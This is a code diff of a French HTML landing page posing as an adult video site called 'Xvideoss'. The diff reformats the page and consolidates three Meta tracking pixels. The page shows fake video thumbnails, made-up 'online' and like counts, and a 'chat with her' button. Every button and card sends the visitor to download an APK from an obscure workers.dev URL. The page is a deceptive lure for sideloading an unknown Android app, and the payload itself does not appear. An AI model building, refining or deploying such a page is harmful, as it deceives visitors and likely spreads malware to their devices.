@@ -1,3 +1,4 @@
+```html
 <!doctype html>
 <html lang="fr">
 <head>
@@ -6,6 +7,7 @@
   <meta name="theme-color" content="#0a0a0f">
   <meta name="description" content="Xvideoss">
   <title>Xvideoss</title>
+
   <style>
     :root {
       --bg: #0a0a0f;
@@ -17,7 +19,13 @@
       --line: #252532;
       --radius: 14px;
     }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     body {
       background: var(--bg);
       color: var(--text);
@@ -26,7 +34,10 @@
       min-height: 100vh;
       -webkit-tap-highlight-color: transparent;
     }
-    a, button { -webkit-tap-highlight-color: transparent; }
+
+    a, button {
+      -webkit-tap-highlight-color: transparent;
+    }
 
     .header {
       position: sticky;
@@ -40,6 +51,7 @@
       align-items: center;
       justify-content: space-between;
     }
+
     .logo {
       font-size: 22px;
       font-weight: 900;
@@ -48,6 +60,7 @@
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
+
     .online {
       font-size: 12px;
       color: #4ade80;
@@ -56,6 +69,7 @@
       border-radius: 20px;
       font-weight: 600;
     }
+
     .online::before {
       content: "●";
       margin-right: 5px;
@@ -65,6 +79,7 @@
     .search-wrap {
       padding: 14px 16px 8px;
     }
+
     .search {
       width: 100%;
       background: var(--card);
@@ -75,7 +90,10 @@
       font-size: 15px;
       outline: none;
     }
-    .search::placeholder { color: var(--muted); }
+
+    .search::placeholder {
+      color: var(--muted);
+    }
 
     .grid {
       display: grid;
@@ -83,8 +101,11 @@
       gap: 12px;
       padding: 12px 12px 20px;
     }
+
     @media (min-width: 500px) {
-      .grid { grid-template-columns: repeat(3, 1fr); }
+      .grid {
+        grid-template-columns: repeat(3, 1fr);
+      }
     }
 
     .card {
@@ -95,7 +116,10 @@
       cursor: pointer;
       transition: transform 0.15s;
     }
-    .card:active { transform: scale(0.97); }
+
+    .card:active {
+      transform: scale(0.97);
+    }
 
     .cover {
       position: relative;
@@ -103,12 +127,14 @@
       background: #1c1c28;
       overflow: hidden;
     }
+
     .cover img {
       width: 100%;
       height: 100%;
       object-fit: cover;
       display: block;
     }
+
     .cover-fallback {
       width: 100%;
       height: 100%;
@@ -119,6 +145,7 @@
       font-size: 13px;
       background: #1c1c28;
     }
+
     .duration {
       position: absolute;
       right: 8px;
@@ -130,6 +157,7 @@
       padding: 3px 7px;
       border-radius: 6px;
     }
+
     .play-icon {
       position: absolute;
       top: 50%;
@@ -144,6 +172,7 @@
       justify-content: center;
       opacity: 0.95;
     }
+
     .play-icon::after {
       content: "";
       display: block;
@@ -158,6 +187,7 @@
     .card-body {
       padding: 10px 10px 12px;
     }
+
     .card-title {
       font-size: 13px;
       font-weight: 600;
@@ -169,6 +199,7 @@
       overflow: hidden;
       min-height: 34px;
     }
+
     .card-meta {
       display: flex;
       justify-content: space-between;
@@ -176,10 +207,12 @@
       font-size: 11px;
       color: var(--muted);
     }
+
     .likes {
       color: #ff6b81;
       font-weight: 600;
     }
+
     .download-btn {
       background: var(--accent);
       color: #fff;
@@ -227,6 +260,7 @@
       align-items: center;
       gap: 10px;
     }
+
     .bottom-bar button {
       width: 100%;
       max-width: 320px;
@@ -238,9 +272,20 @@
       color: #fff;
       text-align: center;
     }
-    .btn-dl { background: linear-gradient(90deg, #ff2d55, #ff4d6d); }
-    .btn-play { background: #1f2937; border: 1px solid #374151; }
-    .btn-date { background: #1f2937; border: 1px solid #374151; }
+
+    .btn-dl {
+      background: linear-gradient(90deg, #ff2d55, #ff4d6d);
+    }
+
+    .btn-play {
+      background: #1f2937;
+      border: 1px solid #374151;
+    }
+
+    .btn-date {
+      background: #1f2937;
+      border: 1px solid #374151;
+    }
 
     .empty {
       display: none;
@@ -251,67 +296,90 @@
     }
   </style>
 
-  <!-- Meta Pixel -->
+  <!-- Meta Pixel: One shared base script, three Pixel IDs -->
   <script>
-  !function(f,b,e,v,n,t,s)
-  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version="2.0";
-  n.queue=[];t=b.createElement(e);t.async=!0;
-  t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,"script",
-  "https://connect.facebook.net/en_US/fbevents.js");
-  fbq("init", "1517756270194979");
-  fbq("track", "PageView");
+    !function(f,b,e,v,n,t,s) {
+      if(f.fbq) return;
+      n=f.fbq=function() {
+        n.callMethod ?
+        n.callMethod.apply(n,arguments) : n.queue.push(arguments);
+      };
+      if(!f._fbq) f._fbq=n;
+      n.push=n;
+      n.loaded=!0;
+      n.version="2.0";
+      n.queue=[];
+      t=b.createElement(e);
+      t.async=!0;
+      t.src=v;
+      s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s);
+    }(window, document,"script",
+      "https://connect.facebook.net/en_US/fbevents.js");
+
+    const META_PIXEL_IDS = [
+      "1517756270194979",
+      "1765035821237659",
+      "1064836432682396"
+    ];
+
+    META_PIXEL_IDS.forEach(function(pixelId) {
+      fbq("init", pixelId);
+      fbq("trackSingle", pixelId, "PageView");
+    });
   </script>
+
   <noscript>
     <img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=1517756270194979&ev=PageView&noscript=1"/>
+      src="https://www.facebook.com/tr?id=1517756270194979&ev=PageView&noscript=1"/>
+    <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1765035821237659&ev=PageView&noscript=1"/>
+    <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1064836432682396&ev=PageView&noscript=1"/>
   </noscript>
 
-  <!-- Meta Pixel -->
-  <script>
-  !function(f,b,e,v,n,t,s)
-  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version="2.0";
-  n.queue=[];t=b.createElement(e);t.async=!0;
-  t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,"script",
-  "https://connect.facebook.net/en_US/fbevents.js");
-  fbq("init", "1765035821237659");
-  fbq("track", "PageView");
-  </script>
-  <noscript>
-    <img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=1765035821237659&ev=PageView&noscript=1"/>
-  </noscript>
 </head>
 
 <body>
+
   <header class="header">
     <div class="logo">Xvideoss</div>
     <div class="online" id="onlineCount">12,847 en ligne</div>
   </header>
 
   <div class="search-wrap">
-    <input type="search" class="search" id="searchInput"
-           placeholder="Rechercher…" autocomplete="off">
+    <input
+      type="search"
+      class="search"
+      id="searchInput"
+      placeholder="Rechercher…"
+      autocomplete="off">
   </div>
 
   <section class="grid" id="content"></section>
   <div class="empty" id="empty">Aucun résultat</div>
 
-  <button class="float-dl" id="floatDl" type="button">↓<br>DL</button>
+  <button class="float-dl" id="floatDl" type="button">
+    ↓<br>DL
+  </button>
 
   <div class="bottom-bar">
-    <button class="btn-dl" id="btnDownload" type="button">Télécharger & Regarder</button>
-    <button class="btn-play" id="btnPlay" type="button">▶ Lecture immédiate</button>
-    <button class="btn-date" id="btnDate" type="button">💬 Discuter avec elle</button>
+    <button class="btn-dl" id="btnDownload" type="button">
+      Télécharger & Regarder
+    </button>
+
+    <button class="btn-play" id="btnPlay" type="button">
+      ▶ Lecture immédiate
+    </button>
+
+    <button class="btn-date" id="btnDate" type="button">
+      💬 Discuter avec elle
+    </button>
   </div>
 
   <script>
-    const DOWNLOAD_URL = "https://apk-5cf2c56990e4-3456fff6eba24c16.cfluodiye.workers.dev/C77QhEvWRYeN";
+    const DOWNLOAD_URL =
+      "https://apk-5cf2c56990e4-3456fff6eba24c16.cfluodiye.workers.dev/C77QhEvWRYeN";
 
     const ITEMS = [
       {id:"v01", title:"Vidéo 01", cover:"v01.webp", duration:"12:30"},
@@ -343,17 +411,19 @@
 
     function randomLikes() {
       const n = Math.floor(Math.random() * 18000) + 1200;
-      if (n > 9999) return (n/1000).toFixed(1) + "k";
+      if (n > 9999) {
+        return (n / 1000).toFixed(1) + "k";
+      }
       return n.toString();
     }
 
     function escapeHtml(str) {
       return String(str).replace(/[&<>"']/g, c => ({
-        "&":"&amp;",
-        "<":"&lt;",
-        ">":"&gt;",
-        '"':"&quot;",
-        "'":"&#39;"
+        "&": "&amp;",
+        "<": "&lt;",
+        ">": "&gt;",
+        '"': "&quot;",
+        "'": "&#39;"
       })[c]);
     }
 
@@ -368,39 +438,65 @@
     }
 
     function render() {
-      const q = document.getElementById("searchInput").value.trim().toLowerCase();
-      const matches = ITEMS.filter(item => item.title.toLowerCase().includes(q));
+      const q = document.getElementById("searchInput")
+        .value.trim().toLowerCase();
+
+      const matches = ITEMS.filter(item =>
+        item.title.toLowerCase().includes(q)
+      );
 
       const html = matches.map(item => `
         <article class="card" data-download>
           <div class="cover">
-            <img src="${escapeHtml(item.cover)}" alt="" loading="lazy"
-                 onerror="this.style.display='none'; this.parentElement.insertAdjacentHTML('beforeend','<div class=\\'cover-fallback\\'>Image</div>')">
+            <img
+              src="${escapeHtml(item.cover)}"
+              alt=""
+              loading="lazy"
+              onerror="this.style.display='none'; this.parentElement.insertAdjacentHTML('beforeend','<div class=\\'cover-fallback\\'>Image</div>')">
+
             <div class="play-icon"></div>
-            <span class="duration">${escapeHtml(item.duration)}</span>
+
+            <span class="duration">
+              ${escapeHtml(item.duration)}
+            </span>
           </div>
+
           <div class="card-body">
-            <div class="card-title">${escapeHtml(item.title)}</div>
+            <div class="card-title">
+              ${escapeHtml(item.title)}
+            </div>
+
             <div class="card-meta">
               <span class="likes">♥ ${randomLikes()}</span>
-              <button class="download-btn" type="button">Télécharger</button>
+              <button class="download-btn" type="button">
+                Télécharger
+              </button>
             </div>
           </div>
         </article>
       `).join("");
 
       const moreCard = `
-        <article class="card more-card" data-download
-          style="grid-column: 1 / -1; background: linear-gradient(135deg, #1a1a24, #2a1520); border: 1px solid #ff2d55;">
-          <div class="card-body" style="padding: 28px 16px; text-align: center;">
-            <div style="font-size: 18px; font-weight: 800; margin-bottom: 8px; color: #fff;">
+        <article
+          class="card more-card"
+          data-download
+          style="grid-column:1/-1;background:linear-gradient(135deg,#1a1a24,#2a1520);border:1px solid #ff2d55;">
+
+          <div class="card-body"
+            style="padding:28px 16px;text-align:center;">
+
+            <div style="font-size:18px;font-weight:800;margin-bottom:8px;color:#fff;">
               + Voir plus de vidéos gratuites
             </div>
-            <div style="font-size: 13px; color: #9ca3af; margin-bottom: 16px;">
+
+            <div style="font-size:13px;color:#9ca3af;margin-bottom:16px;">
               Téléchargez pour débloquer le catalogue complet
             </div>
-            <button class="download-btn" type="button"
-              style="padding: 12px 24px; font-size: 14px; border-radius: 10px;">
+
+            <button
+              class="download-btn"
+              type="button"
+              style="padding:12px 24px;font-size:14px;border-radius:10px;">
               Télécharger & Voir plus
             </button>
           </div>
@@ -414,26 +510,39 @@
         matches.length ? "none" : "block";
     }
 
-    document.getElementById("onlineCount").textContent = randomOnline();
+    document.getElementById("onlineCount").textContent =
+      randomOnline();
 
     setInterval(() => {
-      document.getElementById("onlineCount").textContent = randomOnline();
+      document.getElementById("onlineCount").textContent =
+        randomOnline();
     }, 18000);
 
-    document.getElementById("searchInput").addEventListener("input", render);
+    document.getElementById("searchInput")
+      .addEventListener("input", render);
 
-    document.getElementById("btnDownload").addEventListener("click", triggerDownload);
-    document.getElementById("btnPlay").addEventListener("click", triggerDownload);
-    document.getElementById("btnDate").addEventListener("click", triggerDownload);
-    document.getElementById("floatDl").addEventListener("click", triggerDownload);
+    document.getElementById("btnDownload")
+      .addEventListener("click", triggerDownload);
 
-    document.getElementById("content").addEventListener("click", (e) => {
-      const card = e.target.closest(".card");
-      if (!card) return;
-      triggerDownload();
-    });
+    document.getElementById("btnPlay")
+      .addEventListener("click", triggerDownload);
+
+    document.getElementById("btnDate")
+      .addEventListener("click", triggerDownload);
+
+    document.getElementById("floatDl")
+      .addEventListener("click", triggerDownload);
+
+    document.getElementById("content")
+      .addEventListener("click", (e) => {
+        const card = e.target.closest(".card");
+        if (!card) return;
+        triggerDownload();
+      });
 
     render();
   </script>
+
 </body>
 </html>
+```
